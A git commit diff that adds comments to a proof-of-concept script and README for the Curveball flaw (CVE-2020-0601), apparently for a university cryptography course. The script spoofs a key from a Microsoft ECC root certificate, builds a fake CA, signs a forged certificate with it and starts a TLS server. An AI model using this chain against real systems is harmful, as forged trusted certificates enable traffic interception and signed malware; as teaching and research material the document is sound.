c27f9fb952b455c8b98c32155cba6e51b145957c
Andres David Vega Botero <andresvegabotero@gmial.com>
2020-07-11 12:54:03 +0200

    Documentation

--- PoC.sh
+++ PoC.sh
@@ -1,27 +1,25 @@
 #!/usr/bin/env bash
 
 # Create the spoofed Key from the Authentic certificate
-
 ruby PoC.rb OriginalCertificates/MicrosoftECCProductRootCertificateAuthority.cer
 
-#openssl ec -in spoofed_ca.key -text -noout
-#
-#openssl x509 -in MicrosoftECCProductRootCertificateAuthority.cer -text -noout
-
+# Generate a new x509 certificate based on this key.
 openssl req -new -x509 -key FakeCertificates/spoofed_ca.key -out FakeCertificates/spoofed_ca.crt
 
-#echo "======================================================================="
-#openssl x509 -in MicrosoftECCProductRootCertificateAuthority.cer -text -noout
-#echo "======================================================================="
-#openssl x509 -in Fake_cert.crt -text -noout
-#echo "======================================================================="
-
+# Generate a new key. It will be used to create a code signing certificate, which we will sign with our own CA.
 openssl ecparam -name secp384r1 -genkey -noout -out FakeCertificates/my_fake_cert.key
 
+# create a new certificate signing request (CSR)
 openssl req -new -key FakeCertificates/my_fake_cert.key -out FakeCertificates/my_fake_cert.csr -config openssl_tls.conf -reqexts v3_tls
 
+# Sign the new CSR with our spoofed CA and CA key
 openssl x509 -req -in FakeCertificates/my_fake_cert.csr -CA FakeCertificates/spoofed_ca.crt -CAkey FakeCertificates/spoofed_ca.key -CAcreateserial -out FakeCertificates/my_fake_cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls
 
+# Move to the TLS folder, to run the Node.js server
 cp FakeCertificates/my_fake_cert.crt TLS/my_fake_cert.crt
 cp FakeCertificates/my_fake_cert.key TLS/my_fake_cert.key
 cp FakeCertificates/spoofed_ca.crt TLS/spoofed_ca.crt
+
+# Run the Node.js Server
+cd TLS
+sudo node index.js
--- README.md
+++ README.md
@@ -1,2 +1,31 @@
-# PoC-Curveball
- Proof Of Concept for the Curveball vunerability. KuS - FH Münster
+# PoC-Curveball (CVE-2020-0601)
+ Proof Of Concept for the Curveball vulnerability for the course
+ Cryptography and Security - FH Münster
+
+> Source: ollypwn (https://github.com/ollypwn/CurveBall)
+
+## Set Up
+is meant to run on linux with the following packages:
+
+` openssl openssl 1.1.0 `
+` ruby 2.4.0 ` 
+` node 10.19.0 `
+
+### Preparing node.js
+
+- Go to the TLS directory
+
+`cd TLS`
+
+- install express
+
+`npm install express`
+
+
+## How to use
+run the POC Bash script, it will run the POC and creates a node server
+
+`bash PoC.sh`
+
+
+
